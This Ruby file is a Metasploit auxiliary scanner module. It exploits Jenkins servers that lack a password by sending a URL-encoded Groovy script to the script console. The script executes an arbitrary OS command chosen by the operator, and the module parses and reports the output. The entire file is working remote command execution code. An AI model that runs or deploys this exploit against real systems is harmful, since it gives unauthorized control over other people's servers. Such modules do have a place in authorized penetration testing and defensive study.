##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'
require 'msf/core'
require 'rexml/document'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Jenkins RCE (via Groovy Script)',
      'Description' => %q{
        This module takes advantage of the lack of password on Jenkins web applications
        and automates the command execution aspect (via groovy script).
      },
      'Author'      =>
        [
             'altonjx',
             'Jeffrey Cap'
        ],
      'References'  => [
        ['URL', 'https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password/']
       ],
      'License'     => MSF_LICENSE
      ))

    register_options(
      [
        OptString.new('TARGETURI',  [ true,  "Path to Jenkins instance", "/jenkins/script"]),
        OptString.new('COMMAND', [true, 'Command to run in application', 'whoami']),
      ], self.class)
    deregister_options('VHOST')
  end

  def fingerprint_os(ip)
    res = send_request_cgi(
      {
        'uri'     => "#{target_uri.path}systemInfo",
        'method'  => 'GET',
        'ctype'   => 'application/x-www-form-urlencoded'
      }
    ).body.to_s
    unless res.nil?
      if res.scan(/os.name(.*?)os.version/m).to_s.downcase.include? "windows"
        return "cmd.exe /c"
      else
        return ""
      end
    end
  end

  def run_host(ip)
    command = datastore['COMMAND'].gsub("\\", "\\\\\\")
    prefix = fingerprint_os(ip)
    res = send_request_cgi(
      {
      'uri'       => "#{target_uri.path}script",
      'method'    => 'POST',
      'ctype'     => 'application/x-www-form-urlencoded',
      'data'      => "script=def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%0D%0Adef+proc+%3D+%27#{prefix}+#{command}%27.execute%28%29%0D%0Aproc.consumeProcessOutput%28sout%2C+serr%29%0D%0Aproc.waitForOrKill%281000%29%0D%0Aprintln+%22out%26gt%3B+%24sout+err%26gt%3B+%24serr%22%0D%0A&json=%7B%22script%22%3A+%22def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%5Cndef+proc+%3D+%27#{prefix}+#{command}%27.execute%28%29%5Cnproc.consumeProcessOutput%28sout%2C+serr%29%5Cnproc.waitForOrKill%281000%29%5Cnprintln+%5C%22out%26gt%3B+%24sout+err%26gt%3B+%24serr%5C%22%5Cn%22%2C+%22%22%3A+%22def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%5Cndef+proc+%3D+%27#{prefix}+#{command}%27.execute%28%29%5Cnproc.consumeProcessOutput%28sout%2C+serr%29%22%7D&Submit=Run"
    }).body.to_s
    if res.nil?
      print_error("#{rhost}:#{rport} - An unknown error occurred when running the command.")
    else
      output = res.scan(/<pre>(.*?)<\/pre>/m)
      if output.to_s.include? "java.lang.Runtime.exec" or output.to_s.include? "not recognized"
        print_error("#{rhost}:#{rport} - Invalid command provided to the OS.")
        report_data(ip, rport, "The command #{command} was not valid on the remote host.")
      elsif !output.empty? and !output.to_s.include? "java.lang.Runtime.exec"
        output = output[1][0][12..-1].gsub("err&amp;gt;", "").strip
        print_good("#{rhost}:#{rport}: The command executed successfully on #{ip}. Output:")
        report_data(ip, rport, "The command #{command} executed successfully.")
        output.split("\n").each{|line| print_good("#{rhost}:#{rport}: #{line.strip}")}
      else
        print_error("#{rhost}:#{rport} - An unknown error has occured when running the command.")
        report_data(ip, rport, "The command #{command} did not execute successfully.")
      end
    end
  end

  def report_data(ip, rport, result)
    report_service(
      :host   => ip,
      :port   => datastore['RPORT'],
      :proto  => 'tcp',
      :info   => result
    )
  end
end
